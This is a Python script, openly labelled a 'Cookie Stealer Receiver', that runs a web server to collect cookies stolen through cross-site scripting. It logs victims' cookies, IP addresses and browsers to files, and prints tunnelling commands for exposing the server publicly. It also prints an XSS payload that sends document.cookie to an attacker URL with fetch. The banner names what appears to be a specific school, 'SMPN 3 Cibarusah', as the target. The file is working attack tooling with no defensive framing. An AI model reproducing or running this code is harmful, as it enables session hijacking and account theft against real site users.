#!/usr/bin/env python3
"""
Cookie Stealer Receiver - XSS Attack
Capture stolen cookies via XSS payload
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime
import json

class CookieReceiver(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse query parameters
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        
        if 'c' in params:
            cookie = params['c'][0]
            url = params.get('u', ['unknown'])[0]
            ua = self.headers.get('User-Agent', 'unknown')
            
            # Beautiful output
            print("\n" + "="*70)
            print("🍪 COOKIE CAPTURED!")
            print("="*70)
            print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"🌐 IP: {self.client_address[0]}")
            print(f"📱 User-Agent: {ua}")
            print(f"🔗 Source URL: {url}")
            print(f"🍪 Cookie: {cookie[:80]}...")
            print("="*70)
            
            # Log to file
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"IP: {self.client_address[0]}\n")
                f.write(f"User-Agent: {ua}\n")
                f.write(f"URL: {url}\n")
                f.write(f"Cookie: {cookie}\n")
                f.write(f"{'='*70}\n")
            
            # Save as JSON for easy parsing
            capture = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'user_agent': ua,
                'url': url,
                'cookie': cookie
            }
            
            with open('cookies.json', 'a') as f:
                f.write(json.dumps(capture) + '\n')
            
            print("\n✅ Saved to:")
            print("   - stolen_cookies.txt")
            print("   - cookies.json")
            print("\n💡 Next step: Import cookie to browser")
            print("   See XSS_ATTACK_COMPLETE_GUIDE.txt Step 5B\n")
        
        # Return 1x1 transparent GIF
        self.send_response(200)
        self.send_header('Content-type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        
        # 1x1 transparent GIF (base64 decoded)
        gif = bytes.fromhex('474946383961010001008000000000ffffff21f90401000000002c00000000010001000002024401003b')
        self.wfile.write(gif)
    
    def log_message(self, format, *args):
        # Suppress default HTTP logging
        pass

def main():
    port = 8080
    
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║                  Cookie Stealer Receiver                          ║
║                  XSS Attack - SMPN 3 Cibarusah                   ║
╚═══════════════════════════════════════════════════════════════════╝
""")
    
    print(f"[*] Starting cookie receiver on port {port}...")
    print(f"[*] Local URL: http://localhost:{port}/steal")
    print()
    print("🌐 To get public URL:")
    print("   Option 1: ngrok http 8080")
    print("   Option 2: ssh -R 80:localhost:8080 serveo.net")
    print("   Option 3: cloudflared tunnel --url localhost:8080")
    print()
    print("📋 XSS Payload template:")
    print("   <img src=x onerror=\"fetch('https://YOUR-URL/steal?c='+document.cookie+'&u='+location.href)\">")
    print()
    print("⏳ Waiting for cookies...\n")
    
    try:
        server = HTTPServer(('0.0.0.0', port), CookieReceiver)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Server stopped")
        print("[*] Check stolen_cookies.txt for captured data")

if __name__ == '__main__':
    main()
